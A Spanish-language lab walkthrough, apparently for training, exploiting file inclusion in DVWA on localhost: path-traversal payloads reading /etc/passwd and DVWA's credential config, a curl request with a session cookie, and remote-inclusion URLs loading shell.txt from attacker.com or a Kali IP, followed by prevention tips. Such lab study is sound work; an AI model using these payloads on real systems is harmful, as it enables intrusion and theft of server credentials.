# 📖 FILE INCLUSION

**File inclusion** significa que una aplicación web permite incluir archivos dentro de su ejecución. Esto ocurre cuando un parámetro (por ejemplo ?page=...) se concatena directamente a una función PHP como:

```php
include($_GET['page']);
```

## Tipos principales

1. **LFI (Local File Incllusion)** → incluir archivos locales del servidor. Ejemplo:

```ruby
http://127.0.0.1:8080/vulnerabilities/fi/?page=../../../../etc/passwd
```

2. **RFI (Remote File Inclusion)** → incluir archivos remotos (si allow_url_include está activado en PHP). Ejemplo:

```ruby
http://127.0.0.1:8080/vulnerabilities/fi/?page=http://attacker.com/shell.txt
```

En DVWA normalmente funciona el LFI, y el RFI solo si lo habilitas en la configuración de PHP.

## 🎯 Objetivo

Explotar vulnerabilidades de **File Inclusion** en DVWA para:

- Leer archivos sensibles del servidor.
- Comprender la diferencia entre **LFI** y **RFI**.
- Intentar escalar hacia ejecución remota de código si es posible.

## 🧪 Paso 1 - Identificar el parámetro vulnerable

Ruta vulnerable en DVWA:

```http
http://127.0.0.1:8080/vulnerabilities/fi/?page=include.php
```

El parámetro `page` incluye tres archivos en el servidor y ya nos indica que no podemos atacar a través de **RFI**: The PHP function allow_url_include is not enabled.

<img width="673" height="248" alt="imagen" src="https://github.com/user-attachments/assets/9b784266-2822-40be-affc-6e701d056afc" />

## 🧪 Paso 2 - Probar inclusión local (LFI)

Tras abrir los 3 archivos nos encontramos con información valiosa sobre la ip, el usuario y otras credenciales.

En nuestra terminal de Kali de ejemplo: intentamos leer `/etc/passwd`

```bash
curl "http://127.0.0.1:8080/vulnerabilities/fi/?page=../../../../etc/passwd" \
  --cookie "PHPSESSID=XXXXX; security=low"
```

## 🧪 Paso 3 - Enumerar archivos interesantes

Algunos objetivos típicos:

- /etc/passwd
- /etc/hosts
- /var/www/html/config/config.inc.php (credenciales en DVWA)

## 🧪 Paso 4 - (Opcional) Remote File Inclusion (RFI)

Si allow_url_include=On, probamos:

```bash
http://127.0.0.1:8080/vulnerabilities/fi/?page=http://<IP-Kali>/shell.txt
```

## ✅ Conclusión

- Explicar diferencia entre LFI y RFI.
- Riesgos en aplicaciones reales.
- Cómo prevenir: sanitizar parámetros, usar listas blancas de archivos, desactivar allow_url_include

